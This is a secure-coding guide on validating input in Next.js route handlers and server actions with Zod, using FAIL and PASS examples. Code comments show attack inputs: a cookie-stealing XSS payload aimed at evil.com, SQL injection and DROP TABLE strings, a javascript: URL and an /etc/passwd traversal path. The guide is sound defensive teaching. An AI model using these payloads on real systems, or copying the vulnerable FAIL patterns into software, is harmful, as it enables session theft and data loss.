# Input Validation

> OWASP API3:2023 (Broken Object Property Level Authorization), API8:2023 (Security Misconfiguration), A03:2021 (Injection)

Every piece of data from the client is hostile until validated. TypeScript types disappear at runtime — they provide zero security.

## The Rule

**Validate all input on the server, at the boundary, before any logic runs.**

```
Client Input → Zod Schema → Validated Data → Business Logic → Database
                  ↑                                              ↑
          reject here                                parameterized queries
```

## Server Action Validation

Server Actions receive untyped input from `FormData` or direct arguments. Always validate.

```tsx
// FAIL — trusting client input types
'use server'
export async function createPost(title: string, body: string) {
  // TypeScript says these are strings — at runtime they could be anything
  await db.insert(posts).values({ title, body, authorId: user.id })
}

// PASS — validate with Zod
'use server'
import { z } from 'zod'
import { getCurrentUser } from '@/data/auth'

const CreatePostSchema = z.object({
  title: z.string().min(1).max(200).trim(),
  body: z.string().min(1).max(10000).trim(),
})

export async function createPost(input: unknown) {
  const user = await getCurrentUser()
  if (!user) throw new Error('Unauthorized')

  const parsed = CreatePostSchema.safeParse(input)
  if (!parsed.success) {
    return { error: parsed.error.flatten().fieldErrors }
  }

  await db.insert(posts).values({
    title: parsed.data.title,
    body: parsed.data.body,
    authorId: user.id,
  })
}
```

### FormData Validation

```tsx
// PASS — validate FormData with Zod
'use server'
const ContactSchema = z.object({
  email: z.string().email(),
  message: z.string().min(10).max(5000).trim(),
})

export async function submitContact(formData: FormData) {
  const parsed = ContactSchema.safeParse({
    email: formData.get('email'),
    message: formData.get('message'),
  })

  if (!parsed.success) {
    return { error: parsed.error.flatten().fieldErrors }
  }

  await sendEmail(parsed.data.email, parsed.data.message)
}
```

## Route Handler Validation

```tsx
// FAIL — no validation, trusts JSON body
export async function POST(request: Request) {
  const body = await request.json()
  await db.insert(users).values(body)  // mass assignment — inserts ANY fields
}

// PASS — strict schema validation
import { z } from 'zod'

const CreateUserSchema = z.object({
  name: z.string().min(1).max(100).trim(),
  email: z.string().email().toLowerCase(),
}).strict()  // .strict() rejects unknown fields

export async function POST(request: Request) {
  const user = await getCurrentUser()
  if (!user?.isAdmin) {
    return Response.json({ error: 'Forbidden' }, { status: 403 })
  }

  let body: unknown
  try {
    body = await request.json()
  } catch {
    return Response.json({ error: 'Invalid JSON' }, { status: 400 })
  }

  const parsed = CreateUserSchema.safeParse(body)
  if (!parsed.success) {
    return Response.json(
      { error: parsed.error.flatten().fieldErrors },
      { status: 422 }
    )
  }

  const newUser = await db.insert(users).values(parsed.data).returning()
  return Response.json(newUser, { status: 201 })
}
```

## Mass Assignment Prevention

API3 (Broken Object Property Level Authorization) — attackers send extra fields to modify properties they shouldn't.

```tsx
// FAIL — spreading request body into update
export async function PATCH(request: Request) {
  const body = await request.json()
  await db.update(users).set(body).where(eq(users.id, userId))
  // Attacker sends: { "name": "Alice", "role": "admin", "verified": true }
}

// PASS — explicit field selection with .strict()
const UpdateProfileSchema = z.object({
  name: z.string().min(1).max(100).trim().optional(),
  bio: z.string().max(500).trim().optional(),
}).strict()  // rejects "role", "verified", or any other field

export async function PATCH(request: Request) {
  const user = await getCurrentUser()
  if (!user) return Response.json({ error: 'Unauthorized' }, { status: 401 })

  const parsed = UpdateProfileSchema.safeParse(await request.json())
  if (!parsed.success) {
    return Response.json({ error: parsed.error.flatten() }, { status: 422 })
  }

  await db.update(users).set(parsed.data).where(eq(users.id, user.id))
  return Response.json({ success: true })
}
```

## SQL Injection Prevention

```tsx
// FAIL — string concatenation in SQL
const result = await db.execute(
  `SELECT * FROM users WHERE email = '${email}'`
  // Attacker sends: ' OR 1=1 --
)

// PASS — parameterized queries with tagged templates
import { sql } from 'drizzle-orm'
const result = await db.execute(
  sql`SELECT * FROM users WHERE email = ${email}`
)

// PASS — ORM methods (Drizzle) — always parameterized
const result = await db
  .select()
  .from(users)
  .where(eq(users.email, email))

// PASS — Prisma — always parameterized
const result = await prisma.user.findUnique({
  where: { email },
})
```

### Dynamic Column/Table Names

Column and table names **cannot** be parameterized. Validate against an allowlist.

```tsx
// FAIL — user controls sort column
const sortBy = searchParams.get('sort')  // attacker sends: "name; DROP TABLE users"
const result = await db.execute(
  sql`SELECT * FROM users ORDER BY ${sql.raw(sortBy)}`
)

// PASS — validate against allowlist
const ALLOWED_SORT_COLUMNS = new Set(['name', 'email', 'createdAt'])

const sortBy = searchParams.get('sort') ?? 'createdAt'
if (!ALLOWED_SORT_COLUMNS.has(sortBy)) {
  return Response.json({ error: 'Invalid sort field' }, { status: 400 })
}

const result = await db
  .select()
  .from(users)
  .orderBy(users[sortBy as keyof typeof users])
```

## XSS Prevention

React escapes rendered content by default. The danger is `dangerouslySetInnerHTML` and unescaped contexts.

```tsx
// FAIL — rendering user HTML directly
function Comment({ html }: { html: string }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />
}
// Attacker stores: <img src=x onerror="document.location='https://evil.com?c='+document.cookie">

// PASS — sanitize if you must render HTML
import DOMPurify from 'isomorphic-dompurify'

function Comment({ html }: { html: string }) {
  const clean = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
    ALLOWED_ATTR: ['href'],
  })
  return <div dangerouslySetInnerHTML={{ __html: clean }} />
}

// BEST — use markdown rendering instead of raw HTML
import { marked } from 'marked'

function Comment({ markdown }: { markdown: string }) {
  const html = DOMPurify.sanitize(marked.parse(markdown))
  return <div dangerouslySetInnerHTML={{ __html: html }} />
}
```

### URL Injection

```tsx
// FAIL — rendering user-supplied URLs without validation
<a href={userProfile.website}>Visit site</a>
// Attacker sets website to: javascript:alert(document.cookie)

// PASS — validate URL scheme
function SafeLink({ href, children }: { href: string; children: React.ReactNode }) {
  const isValid = /^https?:\/\//i.test(href)
  if (!isValid) return <span>{children}</span>
  return <a href={href} rel="noopener noreferrer">{children}</a>
}
```

## Path Traversal Prevention

```tsx
// FAIL — user controls file path
export async function GET(request: Request) {
  const url = new URL(request.url)
  const file = url.searchParams.get('file')
  const content = await fs.readFile(`./uploads/${file}`)  // ../../../etc/passwd
  return new Response(content)
}

// PASS — validate and resolve path
import path from 'path'

const UPLOAD_DIR = path.resolve('./uploads')

export async function GET(request: Request) {
  const url = new URL(request.url)
  const file = url.searchParams.get('file')
  if (!file) return Response.json({ error: 'Missing file' }, { status: 400 })

  const resolved = path.resolve(UPLOAD_DIR, path.basename(file))
  if (!resolved.startsWith(UPLOAD_DIR)) {
    return Response.json({ error: 'Invalid path' }, { status: 400 })
  }

  try {
    const content = await fs.readFile(resolved)
    return new Response(content)
  } catch {
    return Response.json({ error: 'Not found' }, { status: 404 })
  }
}
```

## Common Zod Patterns for API Input

```tsx
// Pagination
const PaginationSchema = z.object({
  page: z.coerce.number().int().min(1).default(1),
  limit: z.coerce.number().int().min(1).max(100).default(20),
})

// Search with sanitization
const SearchSchema = z.object({
  q: z.string().max(200).trim(),
  category: z.enum(['all', 'posts', 'users']).default('all'),
})

// File upload metadata
const UploadSchema = z.object({
  filename: z.string().max(255).regex(/^[a-zA-Z0-9._-]+$/),
  contentType: z.enum(['image/jpeg', 'image/png', 'image/webp', 'application/pdf']),
  size: z.number().int().max(10 * 1024 * 1024),  // 10MB max
})

// Date range
const DateRangeSchema = z.object({
  from: z.coerce.date(),
  to: z.coerce.date(),
}).refine(data => data.from < data.to, {
  message: 'Start date must be before end date',
})

// ID parameter (from route params)
const IdSchema = z.object({
  id: z.string().cuid2(),  // or .uuid() depending on your ID format
})
```

## Audit Patterns

```bash
# Find raw SQL string concatenation
grep -rn "execute\|query\|raw" --include="*.ts" | grep -v "sql\`\|prisma\.\|drizzle"

# Find dangerouslySetInnerHTML without DOMPurify
grep -rn "dangerouslySetInnerHTML" --include="*.tsx" | grep -v "DOMPurify\|sanitize"

# Find Server Actions without Zod validation
grep -rln "'use server'" --include="*.ts" | xargs grep -L "safeParse\|z\.parse\|Schema\.parse\|zod"

# Find Route Handlers without input validation
find . -name "route.ts" | xargs grep -L "safeParse\|parse(\|zod\|z\."

# Find request.json() not followed by validation
grep -rn "request.json()" --include="*.ts" -A5 | grep -v "safeParse\|parse(\|Schema"
```

## Sources

- [OWASP API3:2023 — Broken Object Property Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/)
- [OWASP A03:2021 — Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [Next.js Data Security Guide](https://nextjs.org/docs/app/guides/data-security)
- [Zod Documentation](https://zod.dev)
